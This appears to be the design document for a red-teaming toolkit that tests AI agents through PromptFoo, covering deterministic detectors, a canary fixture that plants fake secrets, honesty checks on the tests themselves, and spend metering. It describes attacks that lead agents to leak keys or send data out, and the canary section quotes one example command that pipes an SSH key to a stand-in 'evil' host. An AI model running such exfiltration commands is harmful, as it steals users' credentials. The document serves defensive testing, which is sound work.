# Design

How the toolkit is put together, and why. The skill is the `agent-redteam/` folder; `tests/`, `mutations/`, `tools/`, `demo/` and this
file are for developing it. `SKILL.md` is the workflow an assistant follows for a developer, `README.md` the quick reference, and this
file the reasoning underneath. Numbers that change with PromptFoo (plugin and strategy counts, which plugins need remote generation)
live in `agent-redteam/scripts/agent_redteam/promptfoo_catalog.json`, captured from the installed binary; this file does not repeat them.

## Contents
- The problem
- Layers
- Data model
- Deterministic checks: detectors, canary oracle
- Grading path
- Honesty checks
- Cost control and key handling
- Setting up PromptFoo
- Results
- Testing discipline
- What was tried and removed
- Scope and limits
- Status

## The problem

Red-teaming your own agent is easy to get wrong in ways that still *look* like success: a fake tool response that resembles nothing
real, an attack that never reached the agent, a defense graded against the words it was written to beat. So wherever a check is
possible, plain Python decides pass or fail, never an LLM's impression; and a set of honesty checks catches the test lying to itself
before a "held" is trusted.

The second half: PromptFoo has a broad red-team feature set but selects none of it for you. The skill reads the agent's code, proposes
plugins and strategies with reasons, assembles PromptFoo's own config, and runs it, so the developer never uses the checkbox wizard.

## Layers

```
RedTeamContext (contracts.py)     what must never happen, in the agent's own terms
        |
detectors/core.py                 generic checks: (Result, RedTeamContext) -> reasons
canary.py                         shell/code/file agents: what the tools actually did to planted files
        |
bridge.py + assert_bridge.py      run every detector, return one PromptFoo GradingResult
assert_canary.py                  the canary oracle as a second PromptFoo assertion
        |
promptfoo eval                    runs the provider under test against every test case
        |
summarize.py                      results.json -> per-attack "x of N", controls apart, flaky/inconclusive flags
```

Beside the grading path: cost control (`meter.py`, `pricing.py`, `estimate.py`, `preflight.py`), PromptFoo setup
(`setup_promptfoo.py`, `promptfoo_catalog.py`, `promptfoo_redteam_config.py`), and the honesty checks (`shape_check`, `vacuous_check`,
`overfit_check`, `coverage_check`, `redteam_config_check`, `replay_check`, `secret_scan`).

## Data model (`contracts.py`)

- **`ToolCall`**: `name`, `args`, `refused` (stopped before reaching the outside system), `returned` (what the tool handed back; this is
  what lets `vacuous_check` run inside the grading path).
- **`Result`**: `replies` and `tools` for one turn. `Result.from_provider(output, metadata)` builds one from the shape a PromptFoo
  provider returns.
- **`RedTeamContext`**: what the agent must never do, in primitives only: `allowed_hosts`, `allowed_email_domains` (`None` skips the
  check, an empty set blocks everything), `forbidden_tools`, `allowances` (attempts per tool per window), `arg_bounds`,
  `max_reply_chars`, `max_tool_calls`. Read from the JSON a user writes (`references/writing-a-context.md`).

Keeping this generic (no `discount_percent`, no `refund_tool`) is deliberate: every detector reads the same primitives, so a new kind
of agent needs a new context file, not new code.

## Deterministic checks

**Detectors** (`detectors/core.py`). `external_link`, `external_email`, `forbidden_tool_used`, `arg_out_of_bounds`, `arg_outside_domains`,
`attempts_over_allowance`, `runaway_output`, `tool_loop`. All of them run on every test; each is inert unless the context configures the
thing it checks, so there is no selection step to get wrong. They are trustworthy as proof because each reads a structured field
(a tool name, an argument, a count) against a bound, never a regex over free text. `external_link` and `external_email` read the *reply*;
`arg_outside_domains` reads the *tool call* (`send_email.to`, `http_post.url`), which is where data actually leaves. A fresh-install run showed
the difference: an agent that emailed an outside address and replied "Sent." passed the reply checks.

**Canary oracle** (`canary.py`). The generic detectors see a tool's *name*; to them `bash` is `bash` whether it ran `ls` or
`curl evil?d=$(cat ~/.ssh/key)`. For agents with shell, code or file tools, `CanaryFixture` plants fake secrets and files (a victim
file, a fake SSH key and token outside the workspace, fake env vars with names a `*_KEY` scrub misses, plus anything the generated
attacks name, via `plant=`), the agent runs, and plain Python checks what was deleted, changed, created, shown, or sent out through an
egress proxy. It sees only what it plants, files under its root, and proxy-aware network clients; reads of unplanted files and raw
sockets are invisible, and every report says so. `workspace_text()` returns only what the agent created or changed, so a file the test
planted is not reported as a leak; `reset()` refuses to start a test on a dirty fixture (root-owned files left by a container) and
takes an `on_undeletable` hook to fix ownership. `replay_check.py` re-sends the final prompt of each adaptive attack through the real
provider, because adaptive strategies replace the provider's metadata and the checks above never run on them.

## Grading path (`bridge.py`, `assert_bridge.py`)

`bridge.grade()` is what PromptFoo calls, through `assert_bridge.py` (a shim for its `file://` Python assertion loader). It reads the
assertion's `context_file` and the test's own `metadata`, then `evaluate_test()` runs every detector and returns
`{"pass": not reasons, "score": 0|1, "reason": ...}`. If the test's metadata carries a `vacuous_check` block and a held result never
reached the planted content, the reason becomes `"inconclusive: ..."`; `pass` and `score` do not change, only what the text claims.

## Honesty checks

They test the *test*, not the agent; each was written after observing the failure it closes. `references/honesty-checks.md` has usage.

- `shape_check`: a fake tool record that invents, lacks or mistypes fields, or leaves empty a list the real one fills.
- `vacuous_check`: did the attack reach the agent at all? (also wired into the grading path above)
- `overfit_check`: does a written defense share n-word runs with the attacks scoring it?
- `coverage_check`: did the context configure anything for a detector to find? It reads the *raw* JSON, because after defaults apply
  an explicit `max_tool_calls: 10` and a silently defaulted one look identical.
- `redteam_config_check`: does the real `promptfooconfig.yaml` (or several, as one run) wire in the bridge and the baseline plugins,
  or does a self-report merely say so? Built after independent sessions each dropped the baseline while describing the process
  correctly.
- `secret_scan`: does the value of your API key appear in a results folder? It prints file names, never the value.

## Cost control and key handling

- **`pricing.py` / `prices.json`**: one source of truth per model family, with its prices and its usage-response `shape` (OpenAI or
  Anthropic). A model with no price raises `KeyError`, so nothing is ever spent unmeasured.
- **`meter.py`**: a local reverse proxy in front of an OpenAI- or Anthropic-shaped API (standard library only). Neither provider's
  tooling, PromptFoo included, has a hard spend cap. It prices every call from real token usage, hard-refuses (`429`) once the budget is
  spent, and logs JSONL. A call already in flight can land a few cents over, a timed-out or cut-off upstream call may still be billed, and a 200
  whose usage cannot be read is billed upstream but counted as $0; all three are logged and the last is counted as `unpriced` in
  `/_meter`, not hidden. It only caps traffic that goes through it, and PromptFoo's remote generation does not.
- **`--key-env NAME`**: the meter reads the real key from its own environment and puts it on every upstream call, dropping whatever the
  caller sent. The agent under test gets a throwaway token. This exists because an agent with a shell can print its environment: in one
  real run the key was forwarded into the agent's container, printed by an attack, and ended up in the saved results, PromptFoo's database
  and cache. Prevention is the fix; `secret_scan` is the safety net. Neither replaces rotating a key that leaked.
- **`estimate.py`**: `tests * repeats * per-call cost`; `--meter-log` replaces the demo-agent default with measured cost from a smoke
  test. The assistant chooses the test count and checks it against the budget; nothing derives the count from the budget yet.
- **`preflight.py`**: every precondition once, each `ok`/`warn`/`fail` with a one-line fix: Python 3.10+, Node 22.22+, PromptFoo findable
  (`--project` looks only in the project), the key present, every model priced, calls routed through the meter, the meter running,
  PromptFoo's remote-generation/sharing/telemetry variables, and (`--docker`) a running Docker daemon.

## Setting up PromptFoo

- **`setup_promptfoo.py`** installs the exact PromptFoo version the catalog was captured from into a private, git-ignored
  `.agent-redteam/` in the project, never touching the project's `package.json`. It never installs Node.
- **`promptfoo_catalog.py`** reads `promptfoo_catalog.json`, which `capture_promptfoo_catalog.py` generates from the installed binary,
  never from docs or memory, so it cannot silently drift. It also records which plugins can only generate on PromptFoo's servers
  (parsed from PromptFoo's own source).
- **`promptfoo_redteam_config.py`** builds `promptfooconfig.yaml` (target, plugins, strategies, `defaultTest.assert` wired to the bridge
  and, for shell agents, the canary), estimates the real test count with PromptFoo's formula, and builds the commands:
  `redteam_generate_args`, `redteam_eval_args` (`-j 1`), `redteam_run_args`, `view_command`, plus `build_handwritten_config` (Path B) and
  `run_env_block` (the `export` lines every command needs). Adaptive strategies send the agent's
  replies to PromptFoo's servers, so these helpers refuse them without explicit approval.
- **Plugin selection stays the assistant's judgment**, guided by `references/promptfoo-plugins-strategies.md`, because mapping arbitrary
  agent code to the right plugins needs comprehension and a keyword heuristic would reintroduce false confidence.
- **Generate, then plant, then evaluate.** Generated attacks name files, processes and repos that the fixture may lack; the agent then
  says "not found" and the test reads as held while nothing was tested. So for shell agents generation and evaluation are separate steps,
  with the prompts read in between.
- PromptFoo's redteam commands stop at an email-verification prompt unless `CI=true`, which is how its own code detects a
  non-interactive run (found by running it, traced in the installed source).

## Results (`summarize.py`)

Turns `results.json` into something a person reads. Per test: runs, how many *succeeded* (the attack succeeding is the bad outcome, so
"held" and PromptFoo's `pass` are opposite-signed on purpose), errors (a missing response is an error, never a silent pass),
disagreements (the deterministic rule wins), flaky, and **inconclusive** (read from each component's own reason, because PromptFoo
overwrites the top-level reason with "All assertions passed"). A test with an `agent_error` is inconclusive. Controls (`ctl-`) are
reported apart and inverted. Red-team tests are named `plugin [strategy] #n`, and a succeeded attack says which check caught it.
`compare()` diffs two runs by rate.

## Testing discipline

Every module has unit tests, and `tools/mutation_check.py` checks the tests: it applies one hand-written breakage at a time from
`mutations/<module>.json`, reruns the tests, and calls it a **survivor** if they still pass. `tools/mutation_all.py` runs every entry
in `tools/mutation_manifest.json`; the bar is zero survivors, because a survivor means a test did not isolate what it claimed. Each run
uses a fresh bytecode directory, since Python can reuse a stale `.pyc` when a same-size edit lands within a second. `demo/` runs the
scripted agents in `agent-redteam/templates/` through real PromptFoo with no model, proving each detector catches a planted flaw and does
not fire on a paired control, including over a real HTTP hop and when the planted content arrives through a RAG tool or memory.

## What was tried and removed

Regex detectors over free text (`payment_instruction`, `claims_human_or_staff`, `makes_commitment`) and exact-substring `secret_leaked` /
`marker_echoed` were removed, not documented as limitations: a differently worded promise, spaced-out secret or other language scored
"held", and a "held" that does not prove what it claims is worse than no check. An `llm_rubric.py` second opinion was built and removed
too: its cost (a model call, non-determinism, a new attack surface in whatever reads the transcript) was not worth building in by
default. Letting an LLM judge everything was rejected for the structured checks, which are language-free and need a stable ground truth.
`references/detectors.md` says what to do when a project needs a secret-leak check.

## Scope and limits

A developer self-check, not an independent security review. PromptFoo (Node 22.22+) is the runner and viewer today; a plain-Python
runner is planned, not built. For hand-written attacks it tests exactly what the `RedTeamContext` describes. For PromptFoo's plugins
only tool and permission boundaries (and the link/email corner of data exfiltration) get a deterministic check; injection, PII, content
safety and the rest get PromptFoo's own LLM grader, said plainly. The canary sees only what it plants. A `RedTeamContext` field left
empty looks, after the fact, like one decided to be irrelevant; `coverage_check` exposes it but nothing forces anyone to run it. There
is no generic "this argument must equal what an earlier tool returned" detector (a project-local check is the workaround).

## Status

Done: the core checks, the canary oracle, proof against planted flaws (including HTTP and RAG/memory variants), PromptFoo auto-setup,
the provider-aware meter with key handling, real runs against live APIs on three third-party agents, CI (lint, tests on Python 3.10, 3.12 and 3.14, mutation check, demos),
and a protected `main`. Open: the evidence is small (a few agents, one repeat each, one target model), the Anthropic usage parsing is
unit-tested only, nothing derives the test count from the budget, a fresh-install run has covered a scripted agent only (not yet a shell/code agent through the
shortened `SKILL.md` with plant-and-evaluate), and there is no release yet.
